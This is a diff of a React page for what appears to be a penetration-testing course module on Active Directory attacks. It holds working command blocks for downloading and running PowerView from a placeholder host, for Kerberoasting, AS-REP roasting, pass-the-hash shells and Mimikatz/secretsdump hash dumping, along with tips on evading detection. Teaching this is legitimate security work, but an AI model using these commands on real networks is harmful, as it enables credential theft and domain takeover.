@@ -1,39 +1,32 @@
 'use client'
 import React from 'react'
 import Link from 'next/link'
+import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'
 
-const H2 = ({ children }: { children: React.ReactNode }) => (
-  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: '#ff4136', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
-    <span style={{ color: '#3a0000', fontSize: '0.8rem' }}>//</span> {children}
-  </h2>
-)
-const H3 = ({ children }: { children: React.ReactNode }) => (
-  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#cc2200', marginTop: '2rem', marginBottom: '0.75rem' }}>▸ {children}</h3>
-)
+const accent = '#ff4136'
+
 const P = ({ children }: { children: React.ReactNode }) => (
-  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
+  <p style={{ color: '#9a8a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem', fontFamily: 'sans-serif' }}>{children}</p>
 )
-const Pre = ({ label, children }: { label?: string; children: string }) => (
-  <div style={{ margin: '1rem 0 1.5rem' }}>
-    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
-    <pre style={{ background: '#050000', border: '1px solid #2e0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ff6b6b', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
+
+const H = ({ children }: { children: React.ReactNode }) => (
+  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 700, color: accent, marginTop: '2rem', marginBottom: '0.5rem', letterSpacing: '0.08em' }}>{children}</h3>
+)
+
+const Note = ({ label, children }: { label?: string; children: React.ReactNode }) => (
+  <div style={{ background: 'rgba(255,65,54,0.05)', border: '1px solid rgba(255,65,54,0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
+    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>{label || 'NOTE'}</div>
+    <p style={{ color: '#9a8a8a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
   </div>
 )
-const Alert = ({ type, children }: { type: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
-  const c: Record<string, [string, string, string]> = {
-    info:   ['#ff4136', 'rgba(255,65,54,0.05)',  'NOTE'],
-    warn:   ['#ffb347', 'rgba(255,179,71,0.05)', 'WARNING'],
-    danger: ['#ff4136', 'rgba(255,65,54,0.08)',  'CRITICAL'],
-    tip:    ['#00ff41', 'rgba(0,255,65,0.04)',   'PRO TIP'],
-  }
-  const [color, bg, label] = c[type]
-  return (
-    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
-      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
-      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
-    </div>
-  )
-}
+
+const Pre = ({ label, children }: { label?: string; children: string }) => (
+  <div style={{ margin: '1rem 0 1.5rem' }}>
+    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#7a5a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
+    <pre style={{ background: '#080202', border: '1px solid #2e0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ff6b6b', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
+  </div>
+)
+
 const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
   <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
     <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
@@ -45,7 +38,7 @@ const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
       <tbody>
         {rows.map((row, i) => (
           <tr key={i} style={{ borderBottom: '1px solid #1a0000', background: i % 2 === 0 ? 'transparent' : 'rgba(255,65,54,0.02)' }}>
-            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}
+            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#9a8a8a', verticalAlign: 'top' }}>{cell}</td>)}
           </tr>
         ))}
       </tbody>
@@ -53,522 +46,672 @@ const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
   </div>
 )
 
-export default function ActiveDirectoryModule() {
-  return (
-    <div>
-      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
-        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
-        <span>›</span>
-        <span style={{ color: '#ff4136' }}>ACTIVE DIRECTORY ATTACKS</span>
-        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
-          <span style={{ padding: '3px 10px', background: 'rgba(255,65,54,0.08)', border: '1px solid rgba(255,65,54,0.3)', borderRadius: '3px', color: '#ff4136', fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
-          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.5)', borderRadius: '3px', color: '#ff4136', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB →</Link>
-        </div>
-      </div>
+const chapters: CodexChapter[] = [
+  {
+    id: 'ad-ch1',
+    title: 'Active Directory Architecture',
+    difficulty: 'BEGINNER',
+    readTime: '15 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Active Directory (AD) is Microsoft's directory service — the backbone of nearly every enterprise Windows environment. It authenticates users, manages machines, enforces Group Policy, and controls resource access. For a penetration tester, understanding AD is the single highest-leverage skill in enterprise engagements.</P>
 
-      <div style={{ marginBottom: '2.5rem' }}>
-        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
-        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#ff4136', margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,65,54,0.35)' }}>ACTIVE DIRECTORY ATTACKS</h1>
-        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>
-          AD fundamentals · Enumeration · Kerberoasting · AS-REP Roasting · Pass-the-Hash · DCSync · BloodHound · Lateral movement
-        </p>
-      </div>
+        <H>Core Components</H>
+        <Table headers={['COMPONENT', 'FUNCTION', 'ATTACK RELEVANCE']} rows={[
+          ['Domain Controller (DC)', 'Authenticates users, stores the AD database (NTDS.dit)', 'Primary target — compromise DC = own the domain'],
+          ['NTDS.dit', 'The AD database — contains all user password hashes', 'Dump with DCSync or physical access for all domain hashes'],
+          ['LDAP', 'Protocol for querying AD objects (users, groups, computers)', 'Enumerate users, groups, GPOs, SPN accounts'],
+          ['Kerberos', 'Authentication protocol using tickets instead of passwords', 'Kerberoasting, Pass-the-Ticket, Golden/Silver Tickets'],
+          ['NTLM', 'Older challenge-response auth protocol — still widely used', 'Pass-the-Hash, NTLM relay, Responder captures'],
+          ['Group Policy (GPO)', 'Centrally push configurations to domain machines', 'Writable GPOs allow pushing malicious configs domain-wide'],
+          ['Service Principal Names', 'Identifiers for Kerberos-enabled services', 'Kerberoasting — request TGS ticket for any SPN user'],
+          ['Domain Trust', 'Relationship allowing cross-domain auth', 'Trust abuse for cross-domain privilege escalation'],
+        ]} />
 
-      <div style={{ background: '#0a0000', border: '1px solid #2e0000', borderRadius: '6px', padding: '1.25rem', marginBottom: '2.5rem' }}>
-        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>TABLE OF CONTENTS</div>
-        {['01 — Active Directory Architecture', '02 — Enumeration: BloodHound & Manual', '03 — Kerberos: How It Works & Attack Surface', '04 — Kerberoasting', '05 — AS-REP Roasting', '06 — Pass-the-Hash & Pass-the-Ticket', '07 — DCSync — Dumping the Domain', '08 — Golden & Silver Tickets', '09 — LLMNR/NBT-NS Poisoning', '10 — SMB Relay Attacks', '11 — Lateral Movement with Impacket', '12 — Persistence: Creating Backdoor Accounts', '13 — Defence Evasion in AD Environments'].map((item, i) => (
-          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', padding: '3px 0', display: 'flex', gap: '8px' }}>
-            <span style={{ color: '#3a0000' }}>›</span><span>{item}</span>
-          </div>
-        ))}
-      </div>
-
-      <H2>01 — Active Directory Architecture</H2>
-      <P>Active Directory (AD) is Microsoft's directory service for Windows domain networks. It is the backbone of nearly every enterprise environment — authenticating users, managing computers, enforcing group policies, and controlling access to resources. Understanding AD is the highest-leverage skill in enterprise penetration testing.</P>
-
-      <H3>Core Components</H3>
-      <Table headers={['COMPONENT', 'FUNCTION', 'ATTACK RELEVANCE']} rows={[
-        ['Domain Controller (DC)', 'Authenticates users, stores AD database (NTDS.dit)', 'Primary target — compromise DC = own the domain'],
-        ['NTDS.dit', 'The AD database — contains all user password hashes', 'Dump with DCSync or physical access'],
-        ['LDAP', 'Protocol for querying AD objects', 'Enumerate users, groups, computers, policies'],
-        ['Kerberos', 'Authentication protocol — tickets instead of passwords', 'Kerberoasting, Pass-the-Ticket, Golden Ticket'],
-        ['NTLM', 'Older auth protocol — still widely used', 'Pass-the-Hash, NTLM relay, Responder'],
-        ['Group Policy (GPO)', 'Centrally push configs to machines', 'Abuse writable GPOs to push malicious configs'],
-        ['Service Principal Names (SPNs)', 'Identifiers for services in Kerberos', 'Kerberoasting — request TGS for any SPN'],
-        ['Domain Trust', 'Relationship between domains allowing cross-domain auth', 'Trust abuse for cross-domain privilege escalation'],
-      ]} />
-
-      <H3>Key AD Objects</H3>
-      <Pre label="// POWERSHELL — BASIC AD ENUMERATION (no tools needed)">{`# Get domain info
+        <H>Basic Manual Enumeration (No Tools)</H>
+        <Pre label="// BUILT-IN WINDOWS COMMANDS — NO TOOLS NEEDED">{`# Get domain info
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
-# List all users
+# List all domain users
 net user /domain
 
-# List all groups
+# List all domain groups
 net group /domain
 
-# List domain admins
+# List Domain Admins members
 net group "Domain Admins" /domain
 
-# Current user's privileges
+# Current user privileges and group membership
 whoami /all
 
-# Computer's domain
+# System domain info
 systeminfo | findstr /i "domain"
 
-# Enumerate with PowerView (load first):
+# DNS — find Domain Controllers
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local`}</Pre>
+
+        <H>PowerView Quick Enumeration</H>
+        <Pre label="// POWERVIEW — LOAD AND ENUMERATE">{`# Load PowerView (from compromised host with web access):
 IEX(New-Object Net.WebClient).downloadString('http://YOUR_IP/PowerView.ps1')
+
+# Or bypass execution policy and load from disk:
+powershell -ep bypass -c "Import-Module .\PowerView.ps1"
+
+# Basic enumeration:
 Get-Domain
-Get-DomainUser
+Get-DomainUser | select samaccountname, description
 Get-DomainGroup "Domain Admins" | select members
-Get-DomainComputer | select name,operatingsystem
-Get-DomainGPO | select displayname`}</Pre>
+Get-DomainComputer | select name, operatingsystem
+Get-DomainGPO | select displayname
 
-      <H2>02 — Enumeration: BloodHound & Manual</H2>
-      <P>BloodHound is the single most powerful Active Directory enumeration tool. It maps the entire domain into a graph database showing attack paths — visually revealing how an attacker can move from a compromised user to Domain Admin via relationships that are invisible in manual enumeration.</P>
+# Find Kerberoastable users (have SPNs):
+Get-DomainUser -SPN | select name, serviceprincipalname
 
-      <H3>BloodHound Setup</H3>
-      <Pre label="// BLOODHOUND — COMPLETE SETUP">{`# Install BloodHound (Kali/Debian)
-sudo apt install bloodhound
+# Find AS-REP Roastable users:
+Get-DomainUser -PreauthNotRequired | select samaccountname`}</Pre>
 
-# Install Neo4j (required database)
-sudo apt install neo4j
+        <Note label="BEGINNER NOTE">Think of Active Directory like a company's HR database + security guard combined. The Domain Controller is the head of HR — it knows every employee (user account), their access badge (password hash), and what rooms they can enter (permissions). Attacking AD means convincing HR to hand over everyone's badges.</Note>
+      </div>
+    ),
+    takeaways: [
+      'The Domain Controller stores all domain password hashes in NTDS.dit — it is the ultimate target',
+      'Kerberos uses encrypted tickets for authentication — the ticket encryption is what attackers crack',
+      'NTLM authentication sends the hash directly — hashes can be used without cracking (Pass-the-Hash)',
+      'Built-in Windows commands (net user, whoami) reveal enormous amounts of AD info with no extra tools',
+    ]
+  },
+
+  {
+    id: 'ad-ch2',
+    title: 'Enumeration: BloodHound & LDAP',
+    difficulty: 'INTERMEDIATE',
+    readTime: '20 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>BloodHound is the most powerful Active Directory enumeration tool ever created. It maps the entire domain into a graph database, visually revealing attack paths that are completely invisible in manual enumeration. A path to Domain Admin that would take days to find manually becomes obvious in seconds.</P>
+
+        <H>BloodHound Setup</H>
+        <Pre label="// BLOODHOUND — INSTALL AND START">{`# Install BloodHound and Neo4j (Kali/Debian):
+sudo apt install bloodhound neo4j
+
+# Start Neo4j database:
 sudo neo4j start
 # Open: http://localhost:7474
-# Default: neo4j/neo4j → change password on first login
+# Default creds: neo4j / neo4j — change on first login
 
-# Start BloodHound
+# Start BloodHound GUI:
 bloodhound
-# Enter Neo4j credentials
+# Enter the Neo4j credentials you just set`}</Pre>
 
-# Collect data with SharpHound (run on target, requires domain access):
-# Download from: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
-
-# From compromised Windows host in domain:
+        <H>Collecting Data with SharpHound</H>
+        <Pre label="// SHARPHOUND — DATA COLLECTION FROM TARGET">{`# From a compromised Windows domain-joined host:
 .\SharpHound.exe -c All
-# Creates: 20240101120000_BloodHound.zip
+# Creates: 20240101_BloodHound.zip
 
-# From Kali (with credentials):
+# Remote collection from Kali (needs valid domain creds):
+pip install bloodhound
 python3 bloodhound-python -u USER -p PASS -d domain.local -ns DC_IP -c All
-# pip install bloodhound
+# Creates JSON files in current directory
 
-# Upload ZIP to BloodHound → drag and drop into interface
-# Then query:`}</Pre>
+# Upload to BloodHound:
+# Drag and drop the .zip or JSON files into BloodHound interface`}</Pre>
 
-      <Pre label="// BLOODHOUND — HIGH-VALUE QUERIES">{`# In BloodHound interface, go to Queries tab:
+        <H>High-Value BloodHound Queries</H>
+        <Pre label="// BLOODHOUND — MOST USEFUL QUERIES">{`# In BloodHound — go to Analysis tab:
 
-# 1. Find all Domain Admins
-MATCH (n:Group) WHERE n.name =~ "(?i).*domain admins.*" RETURN n
+Find all Domain Admins
+  → Analysis > Find all Domain Admins
 
-# 2. Shortest path to Domain Admin from owned user
-# Right-click your user → Mark as Owned
-# Analysis → Find Shortest Paths to Domain Admins
+Shortest Attack Path to Domain Admin
+  → Right-click your compromised user → Mark as Owned
+  → Analysis > Find Shortest Paths to Domain Admins
 
-# 3. Find all Kerberoastable users
-MATCH (u:User {hasspn:true}) RETURN u
+Find all Kerberoastable Users (have SPNs)
+  → Analysis > List all Kerberoastable Accounts
 
-# 4. Find users with AS-REP Roasting vulnerability
-MATCH (u:User {dontreqpreauth: true}) RETURN u
+Find AS-REP Roastable Users
+  → Analysis > Find AS-REP Roastable Users
 
-# 5. Find computers where Domain Users can RDP
-MATCH p=(g:Group)-[:CanRDP]->(c:Computer) WHERE g.name =~ "(?i).*domain users.*" RETURN p
+Find computers where Domain Users can RDP
+  → Analysis > Find Workstations where Domain Users can RDP
 
-# 6. Find all ACL attack paths
-Analysis → Find Principals with DCSync Rights
-Analysis → Find Computers with Unsupported Operating Systems`}</Pre>
+Find users with DCSync rights
+  → Analysis > Find Principals with DCSync Rights`}</Pre>
 
-      <H3>Manual LDAP Enumeration</H3>
-      <Pre label="// LDAP ENUMERATION — FROM KALI WITH CREDENTIALS">{`# ldapsearch — query AD via LDAP
-sudo apt install ldap-utils
+        <H>Manual LDAP Enumeration</H>
+        <Pre label="// LDAPSEARCH — QUERY AD DIRECTLY">{`sudo apt install ldap-utils
 
-# Enumerate all users:
-ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
+# Enumerate all domain users:
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
   -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
 
-# Find users with SPN (Kerberoastable):
-ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
+# Find Kerberoastable users (have SPNs):
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
   -b "dc=domain,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" \
   sAMAccountName servicePrincipalName
 
-# Find users with no preauth required (AS-REP Roastable):
-ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
+# Find AS-REP Roastable users (no preauth required):
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
   -b "dc=domain,dc=local" \
   "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
   sAMAccountName
 
-# Enumerate domain admins:
-ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
-  -b "dc=domain,dc=local" \
-  "(&(objectClass=group)(cn=Domain Admins))" member`}</Pre>
+# Enumerate Domain Admins group members:
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
+  -b "dc=domain,dc=local" "(&(objectClass=group)(cn=Domain Admins))" member`}</Pre>
 
-      <H2>03 — Kerberos: How It Works & Attack Surface</H2>
-      <Pre label="// KERBEROS AUTHENTICATION FLOW">{`# Kerberos uses tickets — no passwords sent over network
+        <Note label="PRO TIP">BloodHound's "Shortest Path to Domain Admins" query is the most used feature in real engagements. It finds attack chains like: your user has GenericWrite on a group, that group has AdminTo rights on a machine, and that machine has a session with a Domain Admin. Manually finding this chain would take hours — BloodHound finds it instantly.</Note>
+      </div>
+    ),
+    takeaways: [
+      'BloodHound maps the entire domain graph — use it before manually enumerating attack paths',
+      'SharpHound collects data from inside the domain; bloodhound-python works from Kali with valid creds',
+      'The "Mark as Owned" + "Shortest Path to DA" workflow is the core BloodHound attack loop',
+      'LDAP queries can enumerate Kerberoastable and AS-REP Roastable users directly from Kali',
+    ]
+  },
 
-CLIENT                    KDC (Key Distribution Center)              SERVICE
-  │                              │                                       │
-  │── AS-REQ ─────────────────►  │  (client requests TGT)               │
-  │   Contains: username,         │                                       │
-  │   timestamp encrypted        │                                       │
-  │   with client's NT hash      │                                       │
-  │                              │                                       │
-  │◄─ AS-REP ──────────────────  │  (KDC issues Ticket Granting Ticket)  │
-  │   Contains: TGT encrypted     │                                       │
-  │   with krbtgt hash           │                                       │
-  │                              │                                       │
-  │── TGS-REQ ─────────────────► │  (client wants to access a service)  │
-  │   Contains: TGT + SPN        │                                       │
-  │                              │                                       │
-  │◄─ TGS-REP ─────────────────  │  (KDC issues service ticket)          │
-  │   TGS encrypted with         │                                       │
-  │   SERVICE account hash ◄──── │ ← THIS IS KERBEROASTING TARGET       │
-  │                              │                                       │
-  │── AP-REQ ──────────────────────────────────────────────────────────► │
-  │   Contains: TGS              │                                       │
-  │                              │                   ◄─ AP-REP ──────── │
+  {
+    id: 'ad-ch3',
+    title: 'Kerberoasting & AS-REP Roasting',
+    difficulty: 'INTERMEDIATE',
+    readTime: '18 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>Kerberoasting and AS-REP Roasting are the two most commonly used Kerberos attacks. They both extract encrypted data that can be cracked offline — no brute-forcing the DC, no lockouts, no noise on the wire beyond a single authentication request.</P>
 
-# ATTACK SURFACES:
-# AS-REP: if user has no preauth → KDC sends TGT without verifying → crack offline
-# TGS: ANY domain user can request TGS for ANY SPN → encrypted with service hash → crack
-# TGT: if krbtgt hash known → forge ANY TGT → Golden Ticket`}</Pre>
+        <H>How Kerberos Works (Attack Perspective)</H>
+        <Pre label="// KERBEROS AUTHENTICATION FLOW">{`CLIENT                 KDC (Domain Controller)              SERVICE
+  |                           |                                 |
+  |-- AS-REQ --------------> |   Client proves identity        |
+  |   (encrypted timestamp)   |   using their NT hash           |
+  |                           |                                 |
+  |<- AS-REP --------------- |   KDC returns TGT               |
+  |   TGT encrypted with      |   encrypted with krbtgt hash    |
+  |   krbtgt hash             |                                 |
+  |                           |                                 |
+  |-- TGS-REQ -------------> |   Client requests service ticket|
+  |   (TGT + service SPN)     |   for a specific service        |
+  |                           |                                 |
+  |<- TGS-REP --------------- |   TGS encrypted with            |
+  |   TGS encrypted with      |   SERVICE ACCOUNT hash <------- KERBEROASTING
+  |   service account hash    |                                 |
+  |                           |                                 |
+  |-- AP-REQ ----------------------------------------> |       |
+  |   (TGS presented to service)                       |       |
 
-      <H2>04 — Kerberoasting</H2>
-      <P>Any domain user can request a Ticket Granting Service (TGS) for any Service Principal Name (SPN) in the domain. The TGS is encrypted with the service account's NTLM hash — which can be cracked offline. This requires only a valid domain user account.</P>
+ATTACK SURFACES:
+  AS-REP: If user has no preauth -> KDC sends hash without verifying identity
+  TGS:    Any domain user can request TGS for any SPN -> encrypted with service hash
+  TGT:    If krbtgt hash known -> forge any TGT -> Golden Ticket`}</Pre>
 
-      <Pre label="// KERBEROASTING — FULL ATTACK CHAIN">{`# Step 1: Find Kerberoastable accounts (have SPNs)
-# From Windows (with PowerView):
-Get-DomainUser -SPN | select name,serviceprincipalname
+        <H>Kerberoasting</H>
+        <P>Any domain user can request a Ticket Granting Service (TGS) for any Service Principal Name. The TGS is encrypted with the service account's NTLM hash — crackable offline. Service accounts often have weak passwords and never-expiring credentials.</P>
+        <Pre label="// KERBEROASTING — FULL ATTACK CHAIN">{`# Step 1: Find accounts with SPNs (Kerberoastable)
+# From Kali with impacket:
+python3 GetUserSPNs.py domain.local/user:Password -dc-ip DC_IP
 
-# From Kali (with impacket):
-pip install impacket
-python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP
+# Step 2: Request TGS tickets and capture hashes
+python3 GetUserSPNs.py domain.local/user:Password -dc-ip DC_IP -request
+# Output: $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$domain.local/svc_sql*$a3b...
 
-# Step 2: Request TGS tickets for all SPNs
-python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request
-# Saves hashes to file or displays them
-
-# Output looks like:
-# $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$domain.local/svc_sql*$a3b...
-
-# Step 3: Crack the TGS hash offline
+# Step 3: Crack offline with hashcat
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r rules/best64.rule
 
-# From Windows (no extra tools needed):
-# rubeus.exe kerberoast /outfile:hashes.txt
+# From Windows (no tools needed beyond Rubeus):
+.\rubeus.exe kerberoast /outfile:hashes.txt
 
-# Why this works:
-# - Any domain user can request TGS for any SPN
-# - TGS encrypted with SERVICE ACCOUNT hash (not DC hash)
-# - Service accounts often have weak passwords (never expired)
-# - Entirely offline — no brute force against DC
+# High-value SPN targets:
+# MSSQLSvc, TERMSRV, HTTP, cifs, svc_backup
+# Service accounts often have weak passwords and NEVER expire`}</Pre>
 
-# High value targets:
-# svc_sql, svc_web, svc_backup, MSSQLSvc, TERMSRV
-# These often have domain privileges + weak passwords`}</Pre>
-
-      <H2>05 — AS-REP Roasting</H2>
-      <P>If a user account has "Do not require Kerberos preauthentication" set, the KDC will return an AS-REP encrypted with the user's hash without verifying the requester's identity. This can be requested by anyone — even unauthenticated.</P>
-
-      <Pre label="// AS-REP ROASTING">{`# Step 1: Find AS-REP Roastable users
-# (userAccountControl includes DONT_REQ_PREAUTH flag)
-
-# From Kali (unauthenticated — no credentials needed if you have usernames):
+        <H>AS-REP Roasting</H>
+        <P>If a user has "Do not require Kerberos preauthentication" set, the KDC returns an AS-REP encrypted with the user's hash without verifying who is asking. No credentials required — just a list of usernames.</P>
+        <Pre label="// AS-REP ROASTING — UNAUTHENTICATED ATTACK">{`# Step 1: Find AS-REP Roastable users
+# Unauthenticated (only need usernames):
 python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip DC_IP
 
-# With credentials (enumerate and attack):
-python3 GetNPUsers.py domain.local/user:password -request -format hashcat -dc-ip DC_IP
+# With credentials (enumerate and attack in one step):
+python3 GetNPUsers.py domain.local/user:Password -request -format hashcat -dc-ip DC_IP
 
 # From Windows:
-# rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
+.\rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
 
 # Step 2: Crack the hash
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 
 # Hash format: $krb5asrep$23$user@domain.local:...
 
-# Why this matters:
-# - No credentials needed to attack (just usernames)
-# - Affected users have DONT_REQ_PREAUTH flag set
-# - Rare but extremely high value when found
-# - Check for it on ALL accounts during enum`}</Pre>
+# Why check for this: rare but extremely high value
+# No creds needed - just username spray is enough`}</Pre>
 
-      <H2>06 — Pass-the-Hash & Pass-the-Ticket</H2>
-      <Pre label="// PASS-THE-HASH (PTH) — USE NTLM HASH WITHOUT CRACKING">{`# NTLM authentication sends the hash directly — no need to know plaintext
+        <Note label="OPSEC NOTE">Both attacks generate only a single TGS/AS-REP request — minimal network noise. However, requesting tickets for hundreds of SPNs rapidly will trigger alerts. Request one at a time with delays in monitored environments. AS-REP Roasting is even stealthier since it can be done without any valid credentials.</Note>
+      </div>
+    ),
+    takeaways: [
+      'Kerberoasting requires only a valid domain user account — any user can request a TGS for any SPN',
+      'AS-REP Roasting can be performed without any credentials — only usernames are required',
+      'Both attacks produce hashes that are cracked entirely offline — no lockouts, no brute force against DC',
+      'Service accounts are prime Kerberoasting targets — they often have weak, never-expiring passwords',
+    ]
+  },
 
-# CrackMapExec PTH — test credentials across network:
-cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
+  {
+    id: 'ad-ch4',
+    title: 'Pass-the-Hash & Pass-the-Ticket',
+    difficulty: 'INTERMEDIATE',
+    readTime: '15 min',
+    labLink: '/modules/active-directory/lab',
+    content: (
+      <div>
+        <P>You do not need to crack a hash to use it. NTLM authentication sends the hash directly as proof of identity. If you have the hash, you can authenticate as that user without ever knowing their password. Similarly, Kerberos tickets can be extracted from memory and used directly.</P>
+
+        <H>Pass-the-Hash with CrackMapExec</H>
+        <Pre label="// PASS-THE-HASH — LATERAL MOVEMENT AT SCALE">{`# Test hash across entire subnet (find where it works):
+cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH_HERE
 
 # Execute commands via PTH:
-cme smb 192.168.1.100 -u Administrator -H NTLM_HASH -x "whoami"
+cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE -x "whoami"
+cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE -x "net user /domain"
 
-# PSExec via PTH (gives shell):
+# Dump SAM hashes from remote machine:
+cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE --sam
+
+# List shares:
+cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH_HERE --shares`}</Pre>
+
+        <H>Impacket PTH Execution</H>
+        <Pre label="// IMPACKET — GET SHELLS VIA PASS-THE-HASH">{`# PSExec via PTH (gives SYSTEM shell, leaves logs):
 python3 psexec.py -hashes :NTLM_HASH administrator@192.168.1.100
 
-# WMIExec via PTH (stealthier):
+# WMIExec via PTH (stealthier — no service created):
 python3 wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.100
 
-# SMBExec (no file drop):
+# SMBExec (no file drop on disk):
 python3 smbexec.py -hashes :NTLM_HASH administrator@192.168.1.100
 
-# Get NTLM hash sources:
-# 1. Mimikatz: sekurlsa::logonpasswords
-# 2. Hashdump via Meterpreter
-# 3. SAM dump: reg save HKLM\SAM sam.bak + secretsdump.py
-# 4. NTDS.dit dump via DCSync
+# Format: -hashes LM_HASH:NT_HASH
+# If no LM hash (modern Windows): use aad3b435b51404eeaad3b435b51404ee as LM
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH admin@TARGET`}</Pre>
 
-# Impacket secretsdump — dump hashes remotely if you have admin:
-python3 secretsdump.py domain/user:pass@DC_IP
-python3 secretsdump.py -hashes :NTLM_HASH domain/admin@DC_IP`}</Pre>
+        <H>How to Get NTLM Hashes</H>
+        <Pre label="// HASH EXTRACTION METHODS">{`# 1. Mimikatz (from compromised Windows host):
+sekurlsa::logonpasswords    # dump plaintext + hashes from LSASS
+lsadump::sam                # dump local SAM database
 
-      <Pre label="// PASS-THE-TICKET (PTT) — USE KERBEROS TICKET">{`# Import/export Kerberos tickets for lateral movement
+# 2. Dump SAM remotely (need admin):
+python3 secretsdump.py domain/admin:pass@TARGET
+python3 secretsdump.py -hashes :NTLM_HASH domain/admin@TARGET
 
